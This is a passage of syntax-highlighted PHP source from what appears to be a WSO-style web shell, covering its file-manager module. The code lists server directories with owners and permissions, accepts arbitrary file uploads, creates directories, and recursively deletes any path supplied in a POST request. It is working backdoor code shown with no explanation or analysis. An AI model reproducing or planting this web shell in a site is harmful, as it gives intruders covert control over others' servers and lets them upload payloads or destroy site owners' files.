<span class="lineno"> 563</span>    <span class="k">if</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xC000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span>
<span class="lineno"> 564</span>    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;</span>
<span class="lineno"> 565</span>    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span>
<span class="lineno"> 566</span>    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;</span>
<span class="lineno"> 567</span>    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;</span>
<span class="lineno"> 568</span>    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;</span>
<span class="lineno"> 569</span>    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span>
<span class="lineno"> 570</span>    <span class="k">else</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;</span>
<span class="lineno"> 571</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 572</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0080</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 573</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0040</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 574</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 575</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 576</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0008</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 577</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 578</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 579</span>    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0001</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;T&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 580</span>    <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span>
<span class="lineno"> 581</span> <span class="p">}</span>
<span class="lineno"> 582</span> <span class="k">function</span> <span class="nf">madPermsColor</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 583</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
<span class="lineno"> 584</span>        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=#FF0000&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">madPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 585</span>    <span class="k">elseif</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
<span class="lineno"> 586</span>        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=white&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">madPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 587</span>    <span class="k">else</span>
<span class="lineno"> 588</span>        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=#25ff00&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">madPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 589</span> <span class="p">}</span>
<span class="lineno"> 590</span> 
<span class="lineno"> 591</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;scandir&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 592</span>    <span class="k">function</span> <span class="nf">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 593</span>        <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno"> 594</span>        <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)))</span>
<span class="lineno"> 595</span>            <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
<span class="lineno"> 596</span>        <span class="k">return</span> <span class="nv">$files</span><span class="p">;</span>
<span class="lineno"> 597</span>    <span class="p">}</span>
<span class="lineno"> 598</span> <span class="p">}</span>
<span class="lineno"> 599</span> 
<span class="lineno"> 600</span> 
<span class="lineno"> 601</span> <span class="k">function</span> <span class="nf">madFilesMan</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 602</span>    <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno"> 603</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&amp;lt;script&amp;gt;p1_=p2_=p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 604</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 605</span>        <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno"> 606</span>            <span class="k">case</span> <span class="s1">&#39;uploadFile&#39;</span><span class="o">:</span>
<span class="lineno"> 607</span>                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span>
<span class="lineno"> 608</span>                    <span class="k">echo</span> <span class="s2">&quot;Can&#39;t upload file!&quot;</span><span class="p">;</span>
<span class="lineno"> 609</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 610</span>            <span class="k">case</span> <span class="s1">&#39;mkdir&#39;</span><span class="o">:</span>
<span class="lineno"> 611</span>                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span>
<span class="lineno"> 612</span>                    <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create new dir&quot;</span><span class="p">;</span>
<span class="lineno"> 613</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 614</span>            <span class="k">case</span> <span class="s1">&#39;delete&#39;</span><span class="o">:</span>
<span class="lineno"> 615</span>                <span class="k">function</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 616</span>                    <span class="nv">$path</span> <span class="o">=</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$path</span><span class="o">:</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="lineno"> 617</span>                    <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 618</span>                    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 619</span>                        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$item</span><span class="p">;</span>
<span class="lineno"> 620</span>                        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">)</span>
<span class="lineno"> 621</span>                            <span class="k">continue</span><span class="p">;</span>
<span class="lineno"> 622</span>                        <span class="nv">$type</span> <span class="o">=</span> <span class="nb">filetype</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno"> 623</span>                        <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s2">&quot;dir&quot;</span><span class="p">)</span>
<span class="lineno"> 624</span>                            <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno"> 625</span>                        <span class="k">else</span>
<span class="lineno"> 626</span>                            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno"> 627</span>                    <span class="p">}</span>
<span class="lineno"> 628</span>                    <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
<span class="lineno"> 629</span>                    <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 630</span>                <span class="p">}</span>
<span class="lineno"> 631</span>                <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span>
<span class="lineno"> 632</span>                <span class="nx">deleteDir</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno"> 633</span>                <span class="k">else</span>
<span class="lineno"> 634</span>                <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno"> 635</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 636</span>        <span class="k">default</span><span class="o">:</span>
<span class="lineno"> 637</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 638</span>                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span>
<span class="lineno"> 639</span>                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
<span class="lineno"> 640</span>                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$f</span><span class="p">)</span>
<span class="lineno"> 641</span>                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 642</span>                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
<span class="lineno"> 643</span>                <span class="p">}</span>
<span class="lineno"> 644</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 645</span>        <span class="p">}</span>
<span class="lineno"> 646</span>    <span class="p">}</span>
<span class="lineno"> 647</span>    <span class="nv">$dirContent</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">:</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 648</span>    <span class="k">if</span><span class="p">(</span><span class="nv">$dirContent</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>   <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;|  Access Denied! |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span><span class="nx">madFooter</span><span class="p">();</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 649</span>    <span class="k">global</span> <span class="nv">$sort</span><span class="p">;</span>
<span class="lineno"> 650</span>    <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 651</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 652</span>        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;!s_([A-z]+)_(\d{1})!&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span>
<span class="lineno"> 653</span>            <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="lineno"> 654</span>    <span class="p">}</span>
<span class="lineno"> 655</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno"> 656</span> <span class="s2">&amp;lt;table width=&#39;100%&#39; class=&#39;main&#39; cellspacing=&#39;0&#39; cellpadding=&#39;2&#39;  &amp;gt;</span>
<span class="lineno"> 657</span> <span class="s2">&amp;lt;form name=files method=post&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Size&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Modify&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Owner/Group&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Permissions&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Actions&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 658</span>    <span class="nv">$dirs</span> <span class="o">=</span> <span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 659</span>    <span class="nv">$n</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">);</span>
<span class="lineno"> 660</span>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 661</span>        <span class="nv">$ow</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno"> 662</span>        <span class="nv">$gr</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno"> 663</span>        <span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span>
<span class="lineno"> 664</span>                     <span class="s1">&#39;path&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span>
<span class="lineno"> 665</span>                     <span class="s1">&#39;modify&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])),</span>
<span class="lineno"> 666</span>                     <span class="s1">&#39;perms&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">madPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
<span class="lineno"> 667</span>                     <span class="s1">&#39;size&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
<span class="lineno"> 668</span>                     <span class="s1">&#39;owner&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
<span class="lineno"> 669</span>                     <span class="s1">&#39;group&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span>
<span class="lineno"> 670</span>                    <span class="p">);</span>
<span class="lineno"> 671</span>        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span>
<span class="lineno"> 672</span>            <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;file&#39;</span><span class="p">));</span>
<span class="lineno"> 673</span>        <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span>
<span class="lineno"> 674</span>            <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;link&#39;</span><span class="p">,</span> <span class="s1">&#39;link&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">readlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">])));</span>
<span class="lineno"> 675</span>        <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">))</span>
<span class="lineno"> 676</span>            <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;dir&#39;</span><span class="p">));</span>
<span class="lineno"> 677</span>    <span class="p">}</span>
<span class="lineno"> 678</span>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sort</span><span class="p">;</span>
<span class="lineno"> 679</span>    <span class="k">function</span> <span class="nf">wsoCmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 680</span>        <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;size&#39;</span><span class="p">)</span>
<span class="lineno"> 681</span>            <span class="k">return</span> <span class="nb">strcmp</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]),</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]))</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 682</span>        <span class="k">else</span>
